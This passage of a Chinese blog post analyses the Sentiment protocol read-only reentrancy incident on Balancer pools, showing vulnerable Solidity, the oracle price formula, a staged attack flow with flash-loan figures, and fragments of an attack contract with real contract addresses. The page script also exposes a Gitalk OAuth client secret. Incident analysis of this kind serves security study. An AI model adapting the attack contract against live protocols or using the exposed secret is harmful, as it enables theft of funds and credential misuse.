+<h3 id="7-最终的重入触发"><a href="#7-最终的重入触发" class="headerlink" title="7. 最终的重入触发"></a>7. 最终的重入触发</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function sendValue(address payable recipient, uint256 amount) internal &#123;</span><br><span class="line">    _require(address(this).balance &gt;= amount, Errors.ADDRESS_INSUFFICIENT_BALANCE);</span><br><span class="line"></span><br><span class="line">    // 低级call调用 - 重入攻击的最终触发点</span><br><span class="line">    (bool success, ) = recipient.call&#123; value: amount &#125;(&quot;&quot;);</span><br><span class="line">    _require(success, Errors.ADDRESS_CANNOT_SEND_VALUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="理解重入时机"><a href="#理解重入时机" class="headerlink" title="理解重入时机"></a>理解重入时机</h3><p>从调用链可以清楚看到攻击的关键时序：</p>
+<ol>
+<li><strong>LP代币销毁</strong>：在<code>onExitPool</code>中调用<code>_burnPoolTokens(sender, bptAmountIn)</code>，LP代币被销毁，<code>totalSupply()</code>立即减少</li>
+<li><strong>返回控制权</strong>：<code>onExitPool</code>返回要转移的代币数量给Vault</li>
+<li><strong>代币转移</strong>：在<code>_processExitPoolTransfers</code>中，实际的代币转移开始执行</li>
+<li><strong>ETH转账触发重入</strong>：当转移ETH时，<code>recipient.call&#123; value: amount &#125;(&quot;&quot;)</code>执行，控制权转移给攻击者</li>
+<li><strong>余额更新延迟</strong>：池的内部余额(<code>getPoolTokens()</code>返回值)直到整个<code>_joinOrExit</code>函数最后才更新</li>
+</ol>
+<p><strong>这个时序创造了攻击窗口</strong>：在重入期间，<code>totalSupply()</code>已经大幅减少（分母变小），但<code>getPoolTokens()</code>返回的余额仍然包含即将被转移的代币（分子保持不变），导致LP代币价格被严重高估。</p>
+<h3 id="中间状态利用"><a href="#中间状态利用" class="headerlink" title="中间状态利用"></a>中间状态利用</h3><p>在<code>exitPool</code>操作的中间状态下：</p>
+<ul>
+<li>LP代币总供应量已减少（<code>totalSupply()</code>返回较小值）</li>
+<li>池内代币余额尚未更新（<code>getPoolTokens()</code>返回原始余额）</li>
+<li>这种不一致状态导致LP代币价格被严重高估</li>
+</ul>
+<h3 id="价格计算漏洞"><a href="#价格计算漏洞" class="headerlink" title="价格计算漏洞"></a>价格计算漏洞</h3><p>Sentiment的价格计算公式：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function getPrice(address token) external view returns (uint) &#123;</span><br><span class="line">    (</span><br><span class="line">        address[] memory poolTokens,</span><br><span class="line">        uint256[] memory balances,</span><br><span class="line">    ) = vault.getPoolTokens(IPool(token).getPoolId());</span><br><span class="line"></span><br><span class="line">    uint256[] memory weights = IPool(token).getNormalizedWeights();</span><br><span class="line"></span><br><span class="line">    // 计算不变量和价格因子</span><br><span class="line">    uint length = weights.length;</span><br><span class="line">    uint temp = 1e18;</span><br><span class="line">    uint invariant = 1e18;</span><br><span class="line">    for(uint i; i &lt; length; i++) &#123;</span><br><span class="line">        temp = temp.mulDown(</span><br><span class="line">            (oracleFacade.getPrice(poolTokens[i]).divDown(weights[i]))</span><br><span class="line">            .powDown(weights[i])</span><br><span class="line">        );</span><br><span class="line">        invariant = invariant.mulDown(</span><br><span class="line">            (balances[i] * 10 ** (18 - IERC20(poolTokens[i]).decimals()))</span><br><span class="line">            .powDown(weights[i])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return invariant</span><br><span class="line">        .mulDown(temp)</span><br><span class="line">        .divDown(IPool(token).totalSupply()); // 关键：分母被操纵</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>在重入攻击中，分母<code>totalSupply()</code>大幅减少，而分子（基于池余额的不变量）保持不变，导致价格被高估超过16倍。</p>
+<h2 id="攻击流程详解"><a href="#攻击流程详解" class="headerlink" title="攻击流程详解"></a>攻击流程详解</h2><h3 id="攻击准备"><a href="#攻击准备" class="headerlink" title="攻击准备"></a>攻击准备</h3><ol>
+<li><strong>闪电贷</strong>：借入606 WBTC、10,050.1 WETH、18,000,000 USDC</li>
+<li><strong>建立抵押品</strong>：在Sentiment账户中存入50 WETH，获得221.21 LP代币作为抵押</li>
+</ol>
+<h3 id="攻击执行"><a href="#攻击执行" class="headerlink" title="攻击执行"></a>攻击执行</h3><h3 id="第一阶段：增加流动性"><a href="#第一阶段：增加流动性" class="headerlink" title="第一阶段：增加流动性"></a>第一阶段：增加流动性</h3><ul>
+<li><p>向Balancer池大量注入流动性（606 WBTC + 10,000 WETH + 18,000,000 USDC）</p>
+</li>
+<li><p>获得130,600.98个LP代币</p>
+</li>
+<li><p>此时池状态：</p>
+  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">余额: [646.935 WBTC, 10,666.40 WETH, 19,155,172.17 USDC]总供应量: 139,234.634价格: 正常</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h3 id="第二阶段：触发重入"><a href="#第二阶段：触发重入" class="headerlink" title="第二阶段：触发重入"></a>第二阶段：触发重入</h3><ul>
+<li>调用<code>exitPool</code>提取全部注入的流动性，要求WETH以原生ETH形式返回</li>
+<li>ETH转账触发重入，在<code>fallback</code>函数中执行恶意代码</li>
+</ul>
+<h3 id="第三阶段：价格操纵"><a href="#第三阶段：价格操纵" class="headerlink" title="第三阶段：价格操纵"></a>第三阶段：价格操纵</h3><p>在重入期间的池状态：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">余额: [646.935 WBTC, 10,666.40 WETH, 19,155,172.17 USDC] (未更新)</span><br><span class="line">总供应量: 8,633.65 (已更新)</span><br><span class="line">价格: 3.55 ETH (被高估16倍以上)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="第四阶段：套利获利"><a href="#第四阶段：套利获利" class="headerlink" title="第四阶段：套利获利"></a>第四阶段：套利获利</h3><p>利用被高估的LP代币价格：</p>
+<ol>
+<li>借出461,000 USDC、361,000 USDT、81 WETH、125,000 FRAX</li>
+<li>交换部分FRAX为USDC用于还款</li>
+<li>提取580,000 USDC、360,000 USDT、80 WETH到外部账户</li>
+<li>归还闪电贷，保留利润</li>
+</ol>
+<h2 id="技术实现细节"><a href="#技术实现细节" class="headerlink" title="技术实现细节"></a>技术实现细节</h2><h3 id="核心攻击合约结构"><a href="#核心攻击合约结构" class="headerlink" title="核心攻击合约结构"></a>核心攻击合约结构</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">contract ContractTest is Test &#123;</span><br><span class="line">    // 代币接口</span><br><span class="line">    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);</span><br><span class="line">    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);</span><br><span class="line">    // ... 其他代币</span><br><span class="line"></span><br><span class="line">    // 关键合约接口</span><br><span class="line">    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);</span><br><span class="line">    IAccountManager AccountManager = IAccountManager(0x62c5AA8277E49B3EAd43dC67453ec91DC6826403);</span><br><span class="line">    IWeightedBalancerLPOracle WeightedBalancerLPOracle =</span><br><span class="line">        IWeightedBalancerLPOracle(0x16F3ae9C1727ee38c98417cA08BA785BB7641b5B);</span><br><span class="line"></span><br><span class="line">    // 重入触发点</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (nonce == 2) &#123;</span><br><span class="line">            // 在重入中执行恶意借贷</span><br><span class="line">            borrowAll();</span><br><span class="line">        &#125;</span><br><span class="line">        nonce++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="重入时机控制"><a href="#重入时机控制" class="headerlink" title="重入时机控制"></a>重入时机控制</h3><p>精确控制重入时机，确保在Balancer的中间状态下执行价格查询和借贷操作：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function exitPool() internal &#123;</span><br><span class="line">    // 构造exitPool请求，要求返回ETH</span><br><span class="line">    address[] memory assetsOut = new address[](3);</span><br><span class="line">    assetsOut[1] = address(0); // 关键：请求ETH而非WETH</span><br><span class="line"></span><br><span class="line">    // 执行exitPool，触发ETH转账和重入</span><br><span class="line">    Balancer.exitPool(PoolId, address(this), payable(address(this)), exitPoolRequest);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Sentiment协议只读重入攻击分析</li>
+        <li><strong>Author:</strong> Chiu</li>
+        <li><strong>Created at
+                :</strong> 2025-05-27 10:36:41</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-07-14 21:32:17
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://github.com/Idealist17/github.io/2025/05/27/Sentiment_RO_Reentrancy/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">#区块链</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/DeFi/">#DeFi</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">#攻击事件分析</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/06/02/UniswapV2/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">UniswapV2 walkthrough</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/05/15/Tornado%20Cash%20DAO%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Tornado Cash DAO Incident分析与POC</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: 'Ov23ctdJf8fChgcHijWU',
+                    clientSecret: 'ab085da53c1e5d5699612cc1a17d05a64daa0e25',
+                    repo: 'https://github.com/Idealist17/gitalk',
+                    owner: 'idealist17',
+                    admin: ['idealist17'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Sentiment协议只读重入攻击分析</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="nav-text">漏洞背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0"><span class="nav-text">根本原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%8A%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">攻击链上调用分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-exitPool%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0"><span class="nav-text">1. exitPool入口函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%A0%B8%E5%BF%83%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91"><span class="nav-text">2. 核心处理逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BB%A3%E5%B8%81%E8%BD%AC%E7%A7%BB%E5%A4%84%E7%90%86"><span class="nav-text">3. 代币转移处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%B1%A0%E7%9A%84%E9%80%80%E5%87%BA%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91"><span class="nav-text">4. 池的退出处理逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E9%80%80%E5%87%BA%E4%BB%A3%E5%B8%81%E8%BD%AC%E7%A7%BB%E9%80%BB%E8%BE%91"><span class="nav-text">5. 退出代币转移逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-ETH%E5%8F%91%E9%80%81%E4%B8%8E%E9%87%8D%E5%85%A5%E8%A7%A6%E5%8F%91"><span class="nav-text">6. ETH发送与重入触发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E6%9C%80%E7%BB%88%E7%9A%84%E9%87%8D%E5%85%A5%E8%A7%A6%E5%8F%91"><span class="nav-text">7. 最终的重入触发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%90%86%E8%A7%A3%E9%87%8D%E5%85%A5%E6%97%B6%E6%9C%BA"><span class="nav-text">理解重入时机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E7%8A%B6%E6%80%81%E5%88%A9%E7%94%A8"><span class="nav-text">中间状态利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E6%BC%8F%E6%B4%9E"><span class="nav-text">价格计算漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="nav-text">攻击流程详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%87%86%E5%A4%87"><span class="nav-text">攻击准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C"><span class="nav-text">攻击执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%A2%9E%E5%8A%A0%E6%B5%81%E5%8A%A8%E6%80%A7"><span class="nav-text">第一阶段：增加流动性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%EF%BC%9A%E8%A7%A6%E5%8F%91%E9%87%8D%E5%85%A5"><span class="nav-text">第二阶段：触发重入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%98%B6%E6%AE%B5%EF%BC%9A%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5"><span class="nav-text">第三阶段：价格操纵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%A5%97%E5%88%A9%E8%8E%B7%E5%88%A9"><span class="nav-text">第四阶段：套利获利</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E7%BB%86%E8%8A%82"><span class="nav-text">技术实现细节</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6%E7%BB%93%E6%9E%84"><span class="nav-text">核心攻击合约结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%85%A5%E6%97%B6%E6%9C%BA%E6%8E%A7%E5%88%B6"><span class="nav-text">重入时机控制</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Chiu</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        35 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+    
+<script src="/js/build/libs/minimasonry.min.js"></script>
+
+    
+<script src="/js/build/plugins/masonry.js" type="module"></script>
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
